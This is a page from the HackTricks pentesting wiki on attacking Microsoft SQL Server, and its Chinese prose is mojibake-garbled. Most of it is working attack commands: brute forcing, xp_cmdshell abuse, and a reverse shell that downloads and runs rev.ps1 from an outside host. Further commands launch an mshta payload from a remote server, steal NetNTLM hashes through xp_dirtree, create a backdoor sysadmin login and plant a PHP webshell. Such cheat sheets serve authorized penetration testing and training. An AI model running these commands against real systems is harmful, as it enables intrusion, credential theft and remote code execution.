<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>1433 - Pentesting MSSQL - Microsoft SQL Server</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="1433---pentesting-mssql---microsoft-sql-server"><a class="header" href="#1433---pentesting-mssql---microsoft-sql-server">1433 - Pentesting MSSQL - Microsoft SQL Server</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯</a></h2>
<p>æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Microsoft_SQL_Server">wikipedia</a>:</p>
<blockquote>
<p><strong>Microsoft SQL Server</strong> æ˜¯ç”±å¾®è½¯å¼€å‘çš„ <strong>å…³ç³»æ•°æ®åº“</strong> ç®¡ç†ç³»ç»Ÿã€‚ä½œä¸ºæ•°æ®åº“æœåŠ¡å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªè½¯ä»¶äº§å“ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æ ¹æ®å…¶ä»–è½¯ä»¶åº”ç”¨ç¨‹åºçš„è¯·æ±‚å­˜å‚¨å’Œæ£€ç´¢æ•°æ®â€”â€”è¿™äº›åº”ç”¨ç¨‹åºå¯ä»¥åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œï¼Œä¹Ÿå¯ä»¥åœ¨ç½‘ç»œï¼ˆåŒ…æ‹¬äº’è”ç½‘ï¼‰ä¸Šçš„å¦ä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œã€‚\</p>
</blockquote>
<p><strong>é»˜è®¤ç«¯å£ï¼š</strong> 1433</p>
<pre><code>1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
</code></pre>
<h3 id="é»˜è®¤-ms-sql-ç³»ç»Ÿè¡¨"><a class="header" href="#é»˜è®¤-ms-sql-ç³»ç»Ÿè¡¨"><strong>é»˜è®¤ MS-SQL ç³»ç»Ÿè¡¨</strong></a></h3>
<ul>
<li><strong>master æ•°æ®åº“</strong>: è¯¥æ•°æ®åº“è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒæ•è·äº† SQL Server å®ä¾‹çš„æ‰€æœ‰ç³»ç»Ÿçº§ç»†èŠ‚ã€‚</li>
<li><strong>msdb æ•°æ®åº“</strong>: SQL Server Agent åˆ©ç”¨æ­¤æ•°æ®åº“æ¥ç®¡ç†è­¦æŠ¥å’Œä½œä¸šçš„è°ƒåº¦ã€‚</li>
<li><strong>model æ•°æ®åº“</strong>: ä½œä¸º SQL Server å®ä¾‹ä¸Šæ¯ä¸ªæ–°æ•°æ®åº“çš„è“å›¾ï¼Œä»»ä½•è¯¸å¦‚å¤§å°ã€æ’åºè§„åˆ™ã€æ¢å¤æ¨¡å‹ç­‰çš„æ›´æ”¹éƒ½ä¼šåœ¨æ–°åˆ›å»ºçš„æ•°æ®åº“ä¸­åæ˜ å‡ºæ¥ã€‚</li>
<li><strong>Resource æ•°æ®åº“</strong>: ä¸€ä¸ªåªè¯»æ•°æ®åº“ï¼Œå­˜æ”¾éš SQL Server é™„å¸¦çš„ç³»ç»Ÿå¯¹è±¡ã€‚è¿™äº›å¯¹è±¡è™½ç„¶ç‰©ç†å­˜å‚¨åœ¨ Resource æ•°æ®åº“ä¸­ï¼Œä½†åœ¨æ¯ä¸ªæ•°æ®åº“çš„ sys æ¨¡å¼ä¸­é€»è¾‘å‘ˆç°ã€‚</li>
<li><strong>tempdb æ•°æ®åº“</strong>: ä½œä¸ºç¬æ€å¯¹è±¡æˆ–ä¸­é—´ç»“æœé›†çš„ä¸´æ—¶å­˜å‚¨åŒºåŸŸã€‚</li>
</ul>
<h2 id="æšä¸¾"><a class="header" href="#æšä¸¾">æšä¸¾</a></h2>
<h3 id="è‡ªåŠ¨æšä¸¾"><a class="header" href="#è‡ªåŠ¨æšä¸¾">è‡ªåŠ¨æšä¸¾</a></h3>
<p>å¦‚æœæ‚¨å¯¹è¯¥æœåŠ¡ä¸€æ— æ‰€çŸ¥:</p>
<pre><code class="language-bash">nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;
msf&gt; use auxiliary/scanner/mssql/mssql_ping
</code></pre>
<p>{% hint style="info" %}
å¦‚æœä½ <strong>æ²¡æœ‰</strong> <strong>å‡­æ®</strong>ï¼Œä½ å¯ä»¥å°è¯•çŒœæµ‹å®ƒä»¬ã€‚ä½ å¯ä»¥ä½¿ç”¨ nmap æˆ– metasploitã€‚å°å¿ƒï¼Œå¦‚æœä½ ä½¿ç”¨ç°æœ‰ç”¨æˆ·åå¤šæ¬¡ç™»å½•å¤±è´¥ï¼Œä½ å¯èƒ½ä¼š<strong>é”å®šè´¦æˆ·</strong>ã€‚
{% endhint %}</p>
<h4 id="metasploitéœ€è¦å‡­æ®"><a class="header" href="#metasploitéœ€è¦å‡­æ®">Metasploitï¼ˆéœ€è¦å‡­æ®ï¼‰</a></h4>
<pre><code class="language-bash">#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf&gt; use admin/mssql/mssql_enum #Security checks
msf&gt; use admin/mssql/mssql_enum_domain_accounts
msf&gt; use admin/mssql/mssql_enum_sql_logins
msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata
msf&gt; use auxiliary/scanner/mssql/mssql_hashdump
msf&gt; use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata
msf&gt; use auxiliary/admin/mssql/mssql_idf

#Privesc
msf&gt; use exploit/windows/mssql/mssql_linkcrawler
msf&gt; use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf&gt; use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf&gt; use admin/mssql/mssql_exec #Execute commands
msf&gt; use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf&gt; use windows/manage/mssql_local_auth_bypass
</code></pre>
<h3 id="æš´åŠ›ç ´è§£"><a class="header" href="#æš´åŠ›ç ´è§£"><a href="../../generic-hacking/brute-force.html#sql-server"><strong>æš´åŠ›ç ´è§£</strong></a></a></h3>
<h3 id="æ‰‹åŠ¨æšä¸¾"><a class="header" href="#æ‰‹åŠ¨æšä¸¾">æ‰‹åŠ¨æšä¸¾</a></h3>
<h4 id="ç™»å½•"><a class="header" href="#ç™»å½•">ç™»å½•</a></h4>
<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a></p>
<pre><code class="language-shell"># Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
</code></pre>
<pre><code class="language-bash"># Using Impacket mssqlclient.py
mssqlclient.py [-db volume] &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Using sqsh
sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;
## In case Windows Auth using "." as domain name for local user
sqsh -S &lt;IP&gt; -U .\\&lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;
## In sqsh you need to use GO after writting the query to send it
1&gt; select 1;
2&gt; go
</code></pre>
<h4 id="å¸¸è§æšä¸¾"><a class="header" href="#å¸¸è§æšä¸¾">å¸¸è§æšä¸¾</a></h4>
<pre><code class="language-sql"># Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM &lt;databaseName&gt;.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
</code></pre>
<h4 id="è·å–ç”¨æˆ·"><a class="header" href="#è·å–ç”¨æˆ·">è·å–ç”¨æˆ·</a></h4>
<p>{% content-ref url="types-of-mssql-users.md" %}
<a href="types-of-mssql-users.html">types-of-mssql-users.md</a>
{% endcontent-ref %}</p>
<pre><code class="language-sql"># Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
</code></pre>
<h4 id="è·å–æƒé™"><a class="header" href="#è·å–æƒé™">è·å–æƒé™</a></h4>
<ol>
<li><strong>å¯å®‰å…¨æ€§:</strong> å®šä¹‰ä¸º SQL Server ç®¡ç†çš„ç”¨äºè®¿é—®æ§åˆ¶çš„èµ„æºã€‚è¿™äº›èµ„æºåˆ†ä¸ºï¼š</li>
</ol>
<ul>
<li><strong>æœåŠ¡å™¨</strong> â€“ ç¤ºä¾‹åŒ…æ‹¬æ•°æ®åº“ã€ç™»å½•ã€ç«¯ç‚¹ã€å¯ç”¨æ€§ç»„å’ŒæœåŠ¡å™¨è§’è‰²ã€‚</li>
<li><strong>æ•°æ®åº“</strong> â€“ ç¤ºä¾‹åŒ…æ‹¬æ•°æ®åº“è§’è‰²ã€åº”ç”¨ç¨‹åºè§’è‰²ã€æ¨¡å¼ã€è¯ä¹¦ã€å…¨æ–‡ç›®å½•å’Œç”¨æˆ·ã€‚</li>
<li><strong>æ¨¡å¼</strong> â€“ åŒ…æ‹¬è¡¨ã€è§†å›¾ã€è¿‡ç¨‹ã€å‡½æ•°ã€åŒä¹‰è¯ç­‰ã€‚</li>
</ul>
<ol start="2">
<li><strong>æƒé™:</strong> ä¸ SQL Server å¯å®‰å…¨æ€§ç›¸å…³çš„æƒé™ï¼Œå¦‚ ALTERã€CONTROL å’Œ CREATEï¼Œå¯ä»¥æˆäºˆä¸»ä½“ã€‚æƒé™ç®¡ç†å‘ç”Ÿåœ¨ä¸¤ä¸ªçº§åˆ«ï¼š</li>
</ol>
<ul>
<li><strong>æœåŠ¡å™¨çº§åˆ«</strong> ä½¿ç”¨ç™»å½•</li>
<li><strong>æ•°æ®åº“çº§åˆ«</strong> ä½¿ç”¨ç”¨æˆ·</li>
</ul>
<ol start="3">
<li><strong>ä¸»ä½“:</strong> è¯¥æœ¯è¯­æŒ‡è¢«æˆäºˆå¯å®‰å…¨æ€§æƒé™çš„å®ä½“ã€‚ä¸»ä½“ä¸»è¦åŒ…æ‹¬ç™»å½•å’Œæ•°æ®åº“ç”¨æˆ·ã€‚å¯¹å¯å®‰å…¨æ€§çš„è®¿é—®æ§åˆ¶é€šè¿‡æˆäºˆæˆ–æ‹’ç»æƒé™æˆ–é€šè¿‡å°†ç™»å½•å’Œç”¨æˆ·åŒ…å«åœ¨å…·å¤‡è®¿é—®æƒé™çš„è§’è‰²ä¸­æ¥å®ç°ã€‚</li>
</ol>
<pre><code class="language-sql"># Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE &lt;database&gt;
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
</code></pre>
<h2 id="tricks"><a class="header" href="#tricks">Tricks</a></h2>
<h3 id="æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤"><a class="header" href="#æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤">æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</a></h3>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œä¸ºäº†èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œä¸ä»…éœ€è¦å¯ç”¨ <strong><code>xp_cmdshell</code></strong>ï¼Œè¿˜å¿…é¡»å¯¹ <strong><code>xp_cmdshell</code></strong> å­˜å‚¨è¿‡ç¨‹å…·æœ‰ <strong>EXECUTE æƒé™</strong>ã€‚æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–è°ï¼ˆé™¤äº† sysadminsï¼‰å¯ä»¥ä½¿ç”¨ <strong><code>xp_cmdshell</code></strong>ï¼š</p>
<pre><code class="language-sql">Use master
EXEC sp_helprotect 'xp_cmdshell'
</code></pre>
<p>{% endhint %}</p>
<pre><code class="language-bash"># Username + Password + CMD command
crackmapexec mssql -d &lt;Domain name&gt; -u &lt;username&gt; -p &lt;password&gt; -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d &lt;Domain name&gt; -u &lt;username&gt; -H &lt;HASH&gt; -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' â€”
</code></pre>
<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a></p>
<pre><code class="language-shell"># Executing custom assembly on the current server with windows authentication and executing hostname command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
</code></pre>
<h3 id="steal-netntlm-hash--relay-attack"><a class="header" href="#steal-netntlm-hash--relay-attack">Steal NetNTLM hash / Relay attack</a></h3>
<p>æ‚¨åº”è¯¥å¯åŠ¨ä¸€ä¸ª <strong>SMB æœåŠ¡å™¨</strong> æ¥æ•è·ç”¨äºèº«ä»½éªŒè¯çš„å“ˆå¸Œå€¼ï¼ˆä¾‹å¦‚ <code>impacket-smbserver</code> æˆ– <code>responder</code>ï¼‰ã€‚</p>
<pre><code class="language-bash">xp_dirtree '\\&lt;attacker_IP&gt;\any\thing'
exec master.dbo.xp_dirtree '\\&lt;attacker_IP&gt;\any\thing'
EXEC master..xp_subdirs '\\&lt;attacker_IP&gt;\anything\'
EXEC master..xp_fileexist '\\&lt;attacker_IP&gt;\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer
</code></pre>
<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a></p>
<pre><code class="language-shell"># Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
</code></pre>
<p>{% hint style="warning" %}
æ‚¨å¯ä»¥æ£€æŸ¥é™¤äº† sysadmins ä¹‹å¤–ï¼Œè°æœ‰æƒé™è¿è¡Œè¿™äº› MSSQL å‡½æ•°ï¼š</p>
<pre><code class="language-sql">Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
</code></pre>
<p>{% endhint %}</p>
<p>ä½¿ç”¨å·¥å…·å¦‚ <strong>responder</strong> æˆ– <strong>Inveigh</strong> å¯ä»¥ <strong>çªƒå– NetNTLM å“ˆå¸Œ</strong>ã€‚<br />
æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹é“¾æ¥ä¸­æŸ¥çœ‹å¦‚ä½•ä½¿ç”¨è¿™äº›å·¥å…·ï¼š</p>
<p>{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
<a href="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md</a>
{% endcontent-ref %}</p>
<h3 id="æ»¥ç”¨-mssql-å—ä¿¡ä»»é“¾æ¥"><a class="header" href="#æ»¥ç”¨-mssql-å—ä¿¡ä»»é“¾æ¥">æ»¥ç”¨ MSSQL å—ä¿¡ä»»é“¾æ¥</a></h3>
<p><a href="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.html"><strong>é˜…è¯»æ­¤å¸–å­</strong></a> <strong>ä»¥è·å–æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤åŠŸèƒ½çš„æ›´å¤šä¿¡æ¯ï¼š</strong></p>
<p>{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
<a href="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.html">abusing-ad-mssql.md</a>
{% endcontent-ref %}</p>
<h3 id="å†™å…¥æ–‡ä»¶"><a class="header" href="#å†™å…¥æ–‡ä»¶"><strong>å†™å…¥æ–‡ä»¶</strong></a></h3>
<p>è¦ä½¿ç”¨ <code>MSSQL</code> å†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬ <strong>éœ€è¦å¯ç”¨</strong> <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option"><strong>Ole Automation Procedures</strong></a>ï¼Œè¿™éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œç„¶åæ‰§è¡Œä¸€äº›å­˜å‚¨è¿‡ç¨‹æ¥åˆ›å»ºæ–‡ä»¶ï¼š</p>
<pre><code class="language-bash"># Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET["c"]);?&gt;'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
</code></pre>
<h3 id="ä½¿ç”¨-openrowset-è¯»å–æ–‡ä»¶"><a class="header" href="#ä½¿ç”¨-openrowset-è¯»å–æ–‡ä»¶"><strong>ä½¿ç”¨</strong> OPENROWSET <strong>è¯»å–æ–‡ä»¶</strong></a></h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>MSSQL</code> å…è®¸å¯¹<strong>æ“ä½œç³»ç»Ÿä¸­ä»»ä½•å…·æœ‰è¯»å–æƒé™çš„æ–‡ä»¶è¿›è¡Œè¯»å–</strong>ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ SQL æŸ¥è¯¢ï¼š</p>
<pre><code class="language-sql">SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
</code></pre>
<p>ç„¶è€Œï¼Œ<strong><code>BULK</code></strong> é€‰é¡¹éœ€è¦ <strong><code>ADMINISTER BULK OPERATIONS</code></strong> æˆ– <strong><code>ADMINISTER DATABASE BULK OPERATIONS</code></strong> æƒé™ã€‚</p>
<pre><code class="language-sql"># Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
</code></pre>
<h4 id="åŸºäºé”™è¯¯çš„sqliå‘é‡"><a class="header" href="#åŸºäºé”™è¯¯çš„sqliå‘é‡">åŸºäºé”™è¯¯çš„SQLiå‘é‡ï¼š</a></h4>
